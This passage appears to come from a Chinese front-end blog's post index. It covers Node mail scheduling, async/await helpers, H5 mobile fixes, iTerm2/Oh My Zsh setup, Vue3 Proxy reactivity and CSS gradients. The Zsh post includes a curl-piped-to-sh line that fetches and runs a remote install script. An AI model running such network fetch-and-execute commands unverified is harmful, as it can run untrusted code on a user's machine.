item.LOCATION); let htmlData = await getHtmlData(apiData); await sendMail(transporter, item.TO, htmlData); } catch (error) { console.error(error); } }};getAllDataAndSendMail(); 5. 定时这里用到了 node-schedule 来定时执行任务,它跟 corn 很类似 之不是基于Node的具体用法可见 node-schedule文档这里我使用了 每天早上的 08:15:58 定时发送 尽量不取整点 1234567891011const schedule = require(\"node-schedule\");const config = require(\"./config\");const scheduleRun = fn => { console.log(\"NodeMail: 开始等待目标时刻...\"); let j = schedule.scheduleJob(config.SENDDATE, function() { // SENDDATE: \"58 15 8 * * *\" console.log(\"开始执行任务......\"); fn(); });};module.exports = scheduleRun; 所以只要 引入scheduleRun方法 1scheduleRun(getAllDataAndSendMail); 6. 配置详情因为像邮件 smtp 授权码 是敏感信息 建议放进环境变量 env2 是个不错的工具 ,具体使用可以看env2文档 具体配置详见这里 问题1. 邮箱登陆失败一般是在服务器上运行时,邮箱提供商安全机制 会阻止异地登陆 ,只要去邮箱提供商允许就可以了 2. 发送失败因为多人定制因为邮件内容不一样,所以不是同一封邮件,会额外开辟一个线程发送,可能会超过邮件提供商允许线程","link":"/posts/713d3487/"},{"title":"自建基于掘金API的图床","text":"前言 一直以来，微博图床是很多人的不二选择，图床好处就不说了。只是前段时间开始，微博图床的图 403 好多都不能访问,可能开了防盗链。最近一直在找替代的图床,本来想用picGo 可是是个桌面端 对我不是很方便 ,又找了 语雀 的替代方案 但还是比较麻烦。发现掘金的图片上传有点小操作 ?,花了差不多 2 3 个小时,做了一个基于掘金的图片上传 api的替代图床。 关于本图床基于https://sm.ms网站的样式进行了修改及重制,按照掘金 API 修改了上传参数.基本满足需求 Delete Link 因为掘金没有,也就无效了,不影响使用! 上传服务会因为掘金调整可能随时会挂 ,但上传完成的图片肯定在! 地址https://upload.chenyeah.com 注意仅供学习之用,请勿商用和上传违反中国大陆和香港法律的图片，违者后果自负","link":"/posts/4fdcb40b/"},{"title":"优雅的处理 async/await 异常","text":"每次使用 async/await 都包裹一层 try/catch ，很麻烦，这里提供另外一个思路更好的处理 async/await 我的思考1234567891011121314151617181920212223242526272829303132// 定义一个全局方法async function errorCaptured(asyncFunc) { let args = [...arguments].slice(1); try { let res = await asyncFunc(...args); return [null, res]; } catch (error) { return [error, null]; }}// 一个示例异步函数let asyncFunc = (a, b, c) => { return new Promise((resolve, reject) => { const num = Math.random().toFixed(1); if (num > 0.5) { resolve({ a, b, c }); } else { reject({ a, b, c }); } });};// 运行(async () => { let [err, res] = await errorCaptured(asyncFunc, 1, 2, 3); if (res) { console.log(\"success:\", res); } if (err) { console.log(\"error:\", err); }})(); await-to-js await-to-js 是作者 scopsy 运用 Go-lang 处理异常的灵感 源码是用 ts 写的，短小精悍 await-to-js ts 源码12345678910111213141516export function to( promise: Promise, errorExt?: object): Promise { return promise .then((data: T) => [null, data]) .catch((err: U) => { if (errorExt) { Object.assign(err, errorExt); } return [err, undefined]; });}export default to; await-to-js js 代码1234567891011121314151617/** * @param { Promise } promise * @param { Object= } errorExt - Additional Information you can pass to the err object * @return { Promise } */function to(promise, errorExt) { return promise .then(function(data) { return [null, data]; }) .catch(function(err) { if (errorExt) { Object.assign(err, errorExt); } return [err, undefined]; });} 重新看我的例子123456789101112131415161718192021222324252627282930313233function to(promise, errorExt) { return promise .then(data => [null, data]) .catch(err => { if (errorExt) { Object.assign(err, errorExt); } return [err, undefined]; });}// 一个示例异步函数let asyncFunc = (a, b, c) => { return new Promise((resolve, reject) => { const num = Math.random().toFixed(1); if (num > 0.5) { resolve({ a, b, c }); } else { reject({ a, b, c }); } });};// 运行(async () => { let [err, res] = await to(asyncFunc(1, 2, 3), { errorTxt: \"这是一个错误\" }); if (res) { console.log(\"success:\", res); } if (err) { console.log(\"error:\", err); }})(); 总结两种方法都可以，都是 Go-lang 异常处理的灵感，就性能来说 有一种说法说过多的try catch 影响性能。不过现在已经没啥影响，两种方法都可以！","link":"/posts/9d7da21c/"},{"title":"H5 移动端开发经常遇到的问题","text":"1. 弹出数字键盘12345 安卓跟 IOS 的表现形式应该不一样，大家可以自己试试。当运用了正则 pattern 后，就不用关注 input 的类型了 2. 调用系统的某些功能1234567891011121314151617181920打电话给: 10086发短信给: 10086发邮件给：839626987@qq.com 3. 打开原生应用123456打开微信打开支付宝打开支付宝的扫一扫功能打开支付宝的蚂蚁森林 这种方式叫做 URL Scheme，是一种协议，一般用来访问 APP 或者 APP 中的某个功能/页面（如唤醒 APP 后打开指定页面或者使用某些功能）😒URL Scheme 的基本格式如下： 12345行为(应用的某个功能/页面)|scheme://[path][?query]| |应用标识 功能需要的参数 一般是由 APP 开发者自己定义，比如规定一些参数或者路径让其他开发者来访问，就像上面的例子 🍤 注意事项： 唤醒 APP 的条件是你的手机已经安装了该 APP 某些浏览器会禁用此协议，比如微信内部浏览器（除非开了白名单） 4. 解决 active 伪类失效1 给 body 注册一个空事件即可 😂 5. 忽略自动识别12345 当页面上的内容包含了手机号/邮箱等，会自动转换成可点击的链接 😁 比如你有如下代码： 113192733603 但是有些浏览器会识别为手机，并且可以点击拨号。 6. 解决 input 失焦后页面没有回弹一般出现在 IOS 设备中的微信内部浏览器，出现的条件为：页面高度过小 聚焦时，页面需要往上移动的时候 所以一般 input 在页面上方或者顶部都不会出现无法回弹 🤣解决办法为，在聚焦时，获取当前滚动条高度，然后失焦时，赋值之前获取的高度： 1234567891011121314151617181920212223 export default { data() { return { scrollTop: 0 }; }, methods: { focus() { this.scrollTop = document.scrollingElement.scrollTop; }, blur() { document.scrollingElement.scrollTo(0, this.scrollTop); } } }; 6. 禁止长按以上行为可以总结成这几个（每个手机以及浏览器的表现形式不一样）：长按图片保存、长按选择文字、长按链接/手机号/邮箱时呼出菜单。想要禁止这些浏览器的默认行为，可以使用以下 CSS： 123456789101112131415// 禁止长按图片保存img { -webkit-touch-callout: none; pointer-events: none; // 像微信浏览器还是无法禁止，加上这行样式即可}// 禁止长按选择文字div { -webkit-user-select: none;}// 禁止长按呼出菜单div { -webkit-touch-callout: none;} 7. 滑动不顺畅，粘手一般出现在 IOS 设备中，自定义盒子使用了 overflow: auto || scroll 后出现的情况。优化代码： 123div { -webkit-overflow-scrolling: touch;} 8. 屏幕旋转为横屏时，字体大小会变具体出现的情况不明 😒，有时候有有时候没有，欢迎指出。 优化代码： 123* { -webkit-text-size-adjust: 100%;} 9. 最简单的 rem 自适应大家都知道，rem 的值是根据根元素的字体大小相对计算的，但是我们每个设备的大小不一样，所以根元素的字体大小要动态设置 😂 1html { font-size: calc(100vw / 3.75); } body { font-size: .14rem; } 像我一般的话，直接搞 lib-flexible、postcss-pxtorem 就完事啦！ 10. 滑动穿透当你想在出现遮罩的时候，锁住用户的滚动行为，你可以这么做。假设 HTML 结构如下： 我是弹框 CSS 样式如下： 1234567891011121314151617.mask { position: fixed; top: 0; left: 0; display: flex; justify-content: center; align-items: center; width: 100%; height: 100%; background-color: rgba($color: #333, $alpha: 0.6); .content { padding: 20px; background-color: #fff; width: 300px; }} 可以看到，当在遮罩上滑动的时候，是会穿透到父节点的，最简单的办法就是阻住默认行为： 123document.querySelector(\".mask\").addEventListener(\"touchmove\", event => { event.preventDefault();}); 如果在 vue 中，你可以这么写： 1 如果.content 也有滚动条，那么只要阻止遮罩本身就行： 123document.querySelector(\".mask\").addEventListener(\"touchmove\", event => { if (event.target.classList.contains(\"mask\")) event.preventDefault();}); 或者： 1 这样，当出现遮罩的时候用户的滑动就会被锁住啦 👌","link":"/posts/cc76219/"},{"title":"Mac OS 终端利器 iTerm2 + Oh My Zsh","text":"总结下 Mac OS 上 iTerm2 + Oh My Zsh 的配置 以防又要到处找 1. 安装 iTerm2安装包安装下载地址：https://www.iterm2.com/downloads.html下载的是压缩文件，解压后是执行程序文件，你可以直接双击，或者直接将它拖到 Applications 目录下。 推荐使用 Homebrew （mac 神器，如果不清楚请自行搜索）进行安装： 1$ brew cask install iterm2 2. 配置 Oh My ZshOh My Zsh 是对主题的进一步扩展，地址：https://github.com/robbyrussell/oh-my-zsh 配置 Oh My ZshOh My Zsh 是对主题的进一步扩展，地址：https://github.com/robbyrussell/oh-my-zsh 一键安装： 1$ sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 安装好之后，需要把 Zsh 设置为当前用户的默认 Shell（这样新建标签的时候才会使用 Zsh）： 1$ chsh -s /bin/zsh 然后，我们编辑 .zshrc文件 1vim ~/.zshrc 将主题配置修改为 1ZSH_THEME=\"agnoster\" agnoster是比较常用的 zsh 主题之一，你可以挑选你喜欢的主题zsh 主题列表：https://github.com/robbyrussell/oh-my-zsh/wiki/themes 3. 配置 Meslo 字体使用上面的主题，需要 Meslo 字体支持，要不然会出现乱码的情况 字体下载地址：Meslo LG M Regular for Powerline.ttf 下载好之后，直接双击安装即可。 然后打开 iTerm2，打开 Preferences配置界面，然后Profiles -> Text -> Font -> Chanage Font，选择 Meslo LG M Regular for Powerline 字体。 另外，VS Code 的终端字体，也可以进行配置，打开VS Code，打开用户配置，搜索fontFamily，然后将右边的配置增加 1\"terminal.integrated.fontFamily\": \"Meslo LG M for Powerline\" 4. 声明高亮方法 1 使用 Homebrew 安装： 1$ brew install zsh-syntax-highlighting 安装成功之后 1source ~/.zshrc 在最后一行增加下面配置： 1source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 方法 2 使用 git 安装 12cd ~/.oh-my-zsh/custom/plugins/git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 安装成功之后在.zshrc最后一行增加下面配置： 1source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 5. 自动建议填充这个功能是非常实用的，可以方便我们快速的敲命令。 12cd ~/.oh-my-zsh/custom/plugins/git clone https://github.com/zsh-users/zsh-autosuggestions.git 然后编辑 1vim ~/.zshrc 找到plugins配置，增加zsh-autosuggestions插件。 12345plugins=( git zsh-syntax-highlighting zsh-autosuggestions) 注：上面声明高亮，如果配置不生效的话，在 plugins 配置，再增加 zsh-syntax-highlighting 插件试试。 有时候因为自动填充的颜色和背景颜色很相似，以至于自动填充没有效果，我们可以手动更改下自动填充的颜色配置例如：586e75，示例： 6. 左右键跳转主要是按住option + → or ←键，在命令的开始和结尾跳转切换，原本是不生效的，需要手动开启下。 打开 iTerm2，打开 Preferences 配置界面，然后Profiles → Keys → Load Preset... → Natural Text Editing，就可以了。 7. iTerm2 快速隐藏和显示这个功能也非常使用，就是通过快捷键，可以快速的隐藏和打开 iTerm2，示例配置（Commond + .） 8. iTerm2 隐藏用户名和主机名假如你用的主题是 agnoster，修改方法是进入 oh-my-zsh/themes/然后 1vi agnoster.zsh-theme 编辑主题配置文件，找到如下代码： 12345678# Context: user@hostname (who am I and where am I)prompt_context() { if [[ \"$USER\" != \"$DEFAULT_USER\" || -n \"$SSH_CLIENT\" ]]; then # 修改如下代码，@Mac可以你自己定义 也可以直接注释，这样什么都不会显示了 # prompt_segment black default \"%(!.%{%F{yellow}%}.)$USER@%m\" prompt_segment black default \"%(!.%{%F{yellow}%}.)$USER@Mac\" fi} [tip type=”warning” title=”注意”]改了这个之后 会出现 oh my zsh 无法更新的后遗症 ，这是因为改了 git 版本库的原因解决方法如下[/tip] 12345cd ~/.oh-my-zshgit statusgit stashupgrade_oh_my_zshgit stash pop git stash 讲解请见这里 9. iTerm2 配置代理1vim ~/.zshrc 增加下面配置（按实际使用的协议及端口）： 123# proxy listalias proxy='export all_proxy=socks5://127.0.0.1:1080'alias unproxy='unset all_proxy' iTerm2 需要新建标签页，才有效果： 当需要代理时 先运行 proxy 不需要时再运行unproxy 1234567$ proxy$ curl ip.cn当前 IP：xxx.xxx.xxx.xxx 来自：xx$ unproxy$ curl ip.cn当前 IP：xxx.xxx.xxx.xxx 来自：xx 10. iTerm2 快捷命令快捷命令说明： 命令 说明 command + t 新建标签 command + w 关闭标签 command + 数字 command + 左右方向键 切换标签 command + enter 切换全屏 command + f 查找 command + d 垂直分屏 command + shift + d 水平分屏 command + option + 方向键 command + [ 或 command + ] 切换屏幕 command + ; 查看历史命令 command + shift + h 查看剪贴板历史 ctrl + u 清除当前行 ctrl + l 清屏 ctrl + a 到行首 ctrl + e 到行尾 ctrl + f/b 前进后退 ctrl + p 上一条命令 ctrl + r 搜索命令历史","link":"/posts/8f1dd2ab/"},{"title":"Vue3 中的 Proxy API","text":"在 10 月 05 日凌晨 Vue3 的源代码正式发布了 Object.defineProperty 的一些弊端Vue2.x 中，实现数据的可响应，需要对 Object 和 Array 两种类型采用不同的处理方式。 Object 类型通过 Object.defineProperty 将属性转换成 getter/setter ，这个过程需要递归侦测所有的对象 key，来实现深度的侦测。 为了感知 Array 的变化，对 Array 原型上几个改变数组自身的内容的方法做了拦截，虽然实现了对数组的可响应，但也存在一些问题。 同时，defineProperty 通过递归实现 getter/setter 也有一定的性能问题。 更好的实现方式是通过 ES6 提供的 Proxy 。 Proxy 的一些坑Proxy 具有更加强大的功能， 相比旧的 defineProperty ，Proxy 可以代理数组，并且提供了多个 traps(主要是 get 、 set ) ，可以实现诸多功能。但其中的一些比较容易被忽略的细节。 trap 默认行为123456789101112let data = { info: \"info\" };let p = new Proxy(data, { get(target, key, receiver) { return target[key]; }, set(target, key, value, receiver) { console.log(\"set value\"); target[key] = value; // ? }});p.info = 123; 通过 proxy 返回的对象 p 代理了对原始数据的操作，当对 p 设置时，便可以侦测到变化。 但是这么写实际上是有问题， 当代理的对象数据是数组时，就会报错。 123456789101112let data = [1, 2];let p = new Proxy(data, { get(target, key, receiver) { return target[key]; }, set(target, key, value, receiver) { console.log(\"set value\"); target[key] = value; }});p.push(3); // 报错 将代码更改为： 123456789101112131415let data = [1, 2];let p = new Proxy(data, { get(target, key, receiver) { return target[key]; }, set(target, key, value, receiver) { console.log(\"set value\"); target[key] = value; return true; }});p.push(3);// set value 打印 2 次 实际上，当代理对象是数组，通过 push 操作，并不只是操作当前数据，push 操作还触发数组本身其他属性更改。 12345678910111213141516171819let data = [1, 2];let p = new Proxy(data, { get(target, key, receiver) { console.log(\"get value:\", key); return target[key]; }, set(target, key, value, receiver) { console.log(\"set value:\", key, value); target[key] = value; return true; }});p.push(3);// get value: push// get value: length// set value: 2 3// set value: length 3 先看 set 操作，从打印输出可以看出，push 操作除了给数组的第 2 位下标设置值 3 ，还给数组的 length 值更改为 3。 同时这个操作还触发了 get 去获取 push 和 length 两个属性。 我们可以通过 Reflect 来返回 trap 相应的默认行为，对于 set 操作相对简单，但是一些比较复杂的默认行为处理起来相对繁琐得多，Reflect 的作用就显现出来了。 123456789101112131415161718let data = [1, 2];let p = new Proxy(data, { get(target, key, receiver) { console.log(\"get value:\", key); return Reflect.get(target, key, receiver); }, set(target, key, value, receiver) { console.log(\"set value:\", key, value); return Reflect.set(target, key, value, receiver); }});p.push(3);// get value: push// get value: length// set value: 2 3// set value: length 3 相比自己处理 set 的默认行为，Reflect 就方便得多。 多次触发 set / get当代理对象是数组时，push 操作会触发多次 set 执行，同时，也引发 get 操作，这点非常重要，vue3 就很好的使用了这点。 我们可以从另一个例子来看这个操作： 123456789101112131415161718192021222324let data = [1, 2, 3];let p = new Proxy(data, { get(target, key, receiver) { console.log(\"get value:\", key); return Reflect.get(target, key, receiver); }, set(target, key, value, receiver) { console.log(\"set value:\", key, value); return Reflect.set(target, key, value, receiver); }});p.unshift(\"a\");// get value: unshift// get value: length// get value: 2// set value: 3 3// get value: 1// set value: 2 2// get value: 0// set value: 1 1// set value: 0 a// set value: length 4 可以看到，在对数组做 unshift 操作时，会多次触发 get 和 set 。 仔细观察输出，不难看出，get 先拿数组最末位下标，开辟新的下标 3 存放原有的末位数值，然后再将原数值都往后挪，将 0 下标设置为了 unshift 的值 a ，由此引发了多次 set 操作。 而这对于 通知外部操作 显然是不利，我们假设 set 中的 console 是触发外界渲染的 render 函数，那么这个 unshift 操作会引发 多次 render 。 我们后面会讲述如何解决相应的这个问题，继续。 proxy 只能代理一层123456789101112131415let data = { foo: \"foo\", bar: { key: 1 }, ary: [\"a\", \"b\"] };let p = new Proxy(data, { get(target, key, receiver) { console.log(\"get value:\", key); return Reflect.get(target, key, receiver); }, set(target, key, value, receiver) { console.log(\"set value:\", key, value); return Reflect.set(target, key, value, receiver); }});p.bar.key = 2;// get value: bar 执行代码，可以看到并没有触发 set 的输出，反而是触发了 get ，因为 set 的过程中访问了 bar 这个属性。 由此可见，proxy 代理的对象只能代理到第一层，而对象内部的深度侦测，是需要开发者自己实现的。同样的，对于对象内部的数组也是一样。 123p.ary.push(\"c\");// get value: ary 同样只走了 get 操作，set 并不能感知到。 我们注意到 get/set 还有一个参数：receiver ，对于 receiver ，其实接收的是一个代理对象： 12345678910111213let data = { a: { b: { c: 1 } } };let p = new Proxy(data, { get(target, key, receiver) { console.log(receiver); const res = Reflect.get(target, key, receiver); return res; }, set(target, key, value, receiver) { return Reflect.set(target, key, value, receiver); }});// Proxy {a: {…}} 这里 receiver 输出的是当前代理对象，注意，这是一个已经代理后的对象。 12345678910111213let data = { a: { b: { c: 1 } } };let p = new Proxy(data, { get(target, key, receiver) { const res = Reflect.get(target, key, receiver); console.log(res); return res; }, set(target, key, value, receiver) { return Reflect.set(target, key, value, receiver); }});// {b: {c: 1} } 当我们尝试输出 Reflect.get 返回的值，会发现，当代理的对象是多层结构时，Reflect.get 会返回对象的内层结构。 Vue3 如何解决 proxy 中的细节问题Vue3 项目结构采用了 lerna 做 monorepo 风格的代码管理，目前比较多的开源项目切换到了 monorepo 的模式， 比较显著的特征是项目中会有个 packages/ 的文件夹。 Vue3 对功能做了很好的模块划分，同时使用 TS 。我们直接在 packages 中找到响应式数据的模块： Vue3 中的 reactivity其中，reactive.ts 文件提供了 reactive 函数，该函数是实现响应式的核心。 同时这个函数也挂载在了全局的 Vue 对象上。 这里对源代码做一点程度的简化： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869const rawToReactive = new WeakMap();const reactiveToRaw = new WeakMap();// utilsfunction isObject(val) { return typeof val === \"object\";}function hasOwn(val, key) { const hasOwnProperty = Object.prototype.hasOwnProperty; return hasOwnProperty.call(val, key);}// trapsfunction createGetter() { return function get(target, key, receiver) { const res = Reflect.get(target, key, receiver); return isObject(res) ? reactive(res) : res; };}function set(target, key, val, receiver) { const hadKey = hasOwn(target, key); val = reactiveToRaw.get(val) || val; const result = Reflect.set(target, key, val, receiver); const oldValue = target[key]; if (!hadKey) { console.log(\"trigger ...\"); } else if (val !== oldValue) { console.log(\"trigger ...\"); } return result;}// handlerconst mutableHandlers = { get: createGetter(), set: set};// entryfunction reactive(target) { return createReactiveObject( target, rawToReactive, reactiveToRaw, mutableHandlers );}function createReactiveObject(target, toProxy, toRaw, baseHandlers) { let observed = toProxy.get(target); // 原数据已经有相应的可响应数据, 返回可响应数据 if (observed !== void 0) { return observed; } // 原数据已经是可响应数据 if (toRaw.has(target)) { return target; } observed = new Proxy(target, baseHandlers); toProxy.set(target, observed); toRaw.set(observed, target); return observed;} rawToReactive 和 reactiveToRaw 是两个弱引用的 Map 结构，这两个 Map 用来保存 原始数据 和 可响应数据 ，在函数 createReactiveObject 中，toProxy和 toRaw 传入的便是这两个 Map 。 我们可以通过它们，找到任何代理过的数据是否存在，以及通过代理数据找到原始的数据。 除了保存了代理的数据和原始数据，createReactiveObject 函数仅仅是返回了 new Proxy 代理后的对象。 重点在 new Proxy中传入的 handler 参数 baseHandlers。 还记得前面提到的 Proxy 实现数据侦测的细节问题吧，我们尝试输入： 123let data = { foo: \"foo\", ary: [1, 2] };let r = reactive(data);r.ary.push(3); 打印结果：可以看到打印输出了一次 trigger … 问题一：如何做到深度的侦测数据的 ？深度侦测数据是通过 createGetter 函数实现的，前面提到，当对多层级的对象操作时，set 并不能感知到，但是 get 会触发， 于此同时，利用 Reflect.get() 返回的“多层级对象中内层” ，再对“内层数据”做一次代理。 123456function createGetter() { return function get(target, key, receiver) { const res = Reflect.get(target, key, receiver); return isObject(res) ? reactive(res) : res; };} 可以看到这里判断了 Reflect 返回的数据是否还是对象，如果是对象，则再走一次 proxy，从而获得了对对象内部的侦测。 并且，每一次的 proxy 数据，都会保存在 Map 中，访问时会直接从中查找，从而提高性能。 当我们打印代理后的对象时： 可以看到这个代理后的对象内层并没有代理的标志，这里仅仅是代理外层对象。 输出其中一个存储代理数据的 rawToReactiv ： 对于内层 ary: [1, 2] 的代理，已经被存储在了 rawToReactive 中。 由此实现了深度的数据侦测。 问题二：如何避免多次 trigger ？123456789101112131415161718192021function hasOwn(val, key) { const hasOwnProperty = Object.prototype.hasOwnProperty; return hasOwnProperty.call(val, key);}function set(target, key, val, receiver) { console.log(target, key, val); const hadKey = hasOwn(target, key); val = reactiveToRaw.get(val) || val; const result = Reflect.set(target, key, val, receiver); const oldValue = target[key]; if (!hadKey) { console.log(\"trigger ... is a add OperationType\"); } else if (val !== oldValue) { console.log(\"trigger ... is a set OperationType\"); } return result;} 关于多次trigger 的问题，vue 处理得很巧妙。 在 set 函数中 hasOwn 前打印 console.log(target, key, val) 。 123let data = [\"a\", \"b\"];let r = reactive(data);r.push(\"c\"); r.push('c') 会触发 set 执行两次，一次是值本身 'c' ，一次是 length 属性设置 设置值 'c' 时，传入的新增索引 key 为 2，target 是原始的代理对象 ['a', 'c'] ，hasOwn(target, key) 显然返回 false ，这是一个新增的操作，此时可以执行 trigger ... is a add OperationType 当传入 key 为 length 时，hasOwn(target, key) ，length 是自身属性，返回 true，此时判断 val !== oldValue, val 是 3, 而 oldValue 即为 target['length'] 也是 3，此时不执行 trigger 输出语句。 所以通过 判断 key 是否为 target 自身属性，以及设置 val 是否跟 target[key]相等 可以确定 trigger 的类型，并且避免多余的 trigger 总结Vue3 并非简单的通过 Proxy 来递归侦测数据， 而是通过 get 操作来实现内部数据的代理，并且结合 WeakMap 来对数据保存，这将大大提高响应式数据的性能。","link":"/posts/40a782b4/"},{"title":"从一个文字渐变引发的一系列问题","text":"前言事件的起因是朋友给我发的一个微信 当时就奇怪字体跟数据绑定有啥关系，处于好奇我让他写个 demo 给我看看 ，然后他发来一个代码文件 代码精简如下 123456789101112131415161718192021222324252627282930313233343536373839404142 Demo body { font-size: 40px; } .time1 { display: inline-block; background: linear-gradient(to right, #a6ffcb, #1fa2ff); -webkit-background-clip: text; color: transparent; } {{ time }} new Vue({ el: \"#app\", data: { time: new Date().toLocaleString() }, methods: { updateTime() { this.time = new Date().toLocaleString(); } }, mounted() { setInterval(this.updateTime, 1000); } }); 发现在浏览器下时间并不会改变 ，当我在控制台把颜色注释掉后，发现数据是改变的，这就奇怪了呀！ 这里我就试了下 另一种渐变样式写法 css 文字渐变一些方法background 属性这种我不细说了 也很好理解 可以看上面代码实现方式 mask 属性1234567891011121314 .time2 { position: relative; color: #a6ffcb; } .time2:before { content: attr(time); position: absolute; z-index: 10; color: #1fa2ff; -webkit-mask: linear-gradient(to left, #1fa2ff, transparent); }我是渐变文字 :before 选择器向选定的元素前插入内容。使用 content 属性来指定要插入的内容。mask 属性让元素的某一部分显示或隐藏 第一个：content 取值 attr 就是用来获取属性值的，content:attr(属性名) content: attr(time); 能获取到元素的 time 属性，这里的这个 time 属性是自己自定义的一个属性，随便写 1前端简单说 然后content属性 这样写，content: attr(date); 同样是可以起作用的。 第二个：mask 属性 允许使用者通过部分或者完全隐藏一个元素的可见区域。这种效果可以通过遮罩或者裁切特定区域的图片。 详情可看https://developer.mozilla.org/zh-CN/docs/Web/CSS/mask 回归问题 我们试试另一种情况会不会出现不渲染情况 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758 Demo body { font-size: 40px; } .time1 { display: inline-block; } .time1 { background: linear-gradient(to right, #a6ffcb, #1fa2ff); -webkit-background-clip: text; color: transparent; } .time2 { position: relative; color: #a6ffcb; } .time2:before { content: attr(time); position: absolute; z-index: 10; color: #1fa2ff; -webkit-mask: linear-gradient(to left, #1fa2ff, transparent); } {{ time }} {{ time }} new Vue({ el: \"#app\", data: { time: new Date().toLocaleString() }, methods: { updateTime() { this.time = new Date().toLocaleString(); } }, mounted() { setInterval(this.updateTime, 1000); } }); 看下效果 我当时的表情 我想到了是不是浏览器重排和重绘的问题 浏览器重排和重绘 我们了解下重排和重绘 浏览器编译页面分为 5 步 处理 html 生成 DOM（Document Object Model） Tree 处理 css 生成 CSSOM（CSS Object Model） Tree DOM 树与 CSS-DOM 树合并为 Render 树 对 Render 树进行布局计算 遍历 Render 树的每一个节点绘制到屏幕 重绘与重排概念当 DOM 变化影响了元素的几何属性（宽、高改变等等），浏览器此时需要重新计算元素几何属性，并且页面中其他元素的几何属性可能会受影响，这样渲染树就发生了改变，也就是重新构造 RenderTree 渲染树，这个过程叫做重排（reflow） 如果 DOM 变化仅仅影响的了背景色等等非几何属性，此时就发生了重绘（repaint）而不是重排，因为布局没有发生改变 页面布局和元素几何属性的改变就会导致重排 下列情况会发生重排： 页面初始渲染 添加/删除可见 DOM 元素 改变元素位置 改变元素尺寸（宽、高、内外边距、边框等） 改变元素内容（文本或图片等） 改变窗口尺寸 不同的条件下发生重排的范围及程度会不同 某些情况甚至会重排整个页面，比如滑动滚动条 以下属性或方法会刷新渲染队列(offsetTop、offsetLeft、offsetWidth、offsetHeightclientTop、clientLeft、clientWidth、clientHeightscrollTop、scrollLeft、scrollWidth、scrollHeightgetComputedStyle()（IE 中 currentStyle）) 问题这边时间文字改变了，但文字大小没变，我感觉按道理应该没有触发重排从而使背景色没有改变 ，那我试试改变文字大长度试试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 Demo body { font-size: 40px; } .time1 { display: inline-block; } .time1 { background: linear-gradient(to right, #a6ffcb, #1fa2ff); -webkit-background-clip: text; color: transparent; } .time2 { position: relative; color: #a6ffcb; } .time2:before { content: attr(time); position: absolute; z-index: 10; color: #1fa2ff; -webkit-mask: linear-gradient(to left, #1fa2ff, transparent); } {{ time }} {{ time }} new Vue({ el: \"#app\", data: { time: new Date().toLocaleString(), arr: [ \"奥术大师大所大所\", \"噶事发傻手法十分\", \"按时间大胜靠德德\", \"奥斯卡拉家带口拉丝机迪卡龙\" ] }, methods: { updateTime() { // this.time = new Date().toLocaleString(); this.time = this.arr[Math.floor(Math.random() * this.arr.length)]; } }, mounted() { setInterval(this.updateTime, 1000); } }); 效果如下 发现确实，文字长度没变，第一个不会重新渲染，长度一旦发生改变，第一个才会改变渲染，而第二个一直在渲染 问题好像突然找到原因了，但我又无意发现新的问题 新的问题12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 Demo body { font-size: 40px; } .time1 { display: inline-block; } .time1, .time3 { background: linear-gradient(to right, #a6ffcb, #1fa2ff); -webkit-background-clip: text; color: transparent; } .time2 { position: relative; color: #a6ffcb; } .time2:before { content: attr(time); position: absolute; z-index: 10; color: #1fa2ff; -webkit-mask: linear-gradient(to left, #1fa2ff, transparent); } {{ time }} {{ time }} {{ time }} new Vue({ el: \"#app\", data: { msg: \"Hello\", time: new Date().toLocaleString() }, methods: { updateTime() { this.time = new Date().toLocaleString(); } }, mounted() { setInterval(this.updateTime, 1000); } }); 当我改变 dom 结构发现又好了 效果如下 好了 我彻底呆了 最后最后我也没搞明白，不过为了保险起见以后类似这种还是用第二种渐变样式吧！","link":"/posts/679c2788/"},{"title":"前端重要知识点汇总","text":"《互联网公司招聘启事的正确阅读方式》 前端面试记观看。 js 题目大部分答案可以在谷歌上搜到。 套路 举例 将不会的变成会的 侃侃而谈 HTML 押题 （必考） 你是如何理解 HTML 语义化的？第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签第二种最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签语义化的好处是已读、有利于 SEO 等。第三种：对面试官说请看文章 https://zhuanlan.zhihu.com/p/32570423 meta viewport 是做什么用的，怎么写？死背：123 控制页面在移动端不要缩小显示。侃侃而谈一开始，所有页面都是给 PC 准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。 canvas 元素是干什么的？项目丢给他。看 MDN 的 canvas 入门手册。 CSS 押题 （必考） 说说盒模型。 举例：content-box: width == 内容区宽度border-box: width == 内容区宽度 + padding 宽度 + border 宽度 css reset 和 normalize.css 有什么区别？ 考英文： reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式 normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。 （必考）如何居中？ 平时总结： 水平居中： 内联：爸爸身上写 text-align:center; 块级：margin-left: auto; margin-right: auto; 垂直居中： https://jscode.me/t/topic/1936 选择器优先级如何确定？ 选择器越具体，优先级越高。 #xxx 大于 .yyy 同样优先级，写在后面的覆盖前面的。 color: red !important; 优先级最高。 BFC 是什么？ 举例： overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动） overflow:hidden 取消父子 margin 合并。http://jsbin.com/conulod/1/edit?html,css,js,output （方方用 padding-top: 1px;） 如何清除浮动？ overflow: hidden （方方反对） .clearfix 清除浮动写在爸爸身上12345678.clearfix::after { content: \\\"\\\"; display: block; clear: both;}.clearfix { zoom: 1; /* IE 兼容 */} JS 押题 JS 有哪些数据类型？string number bool undefined null object symbolobject 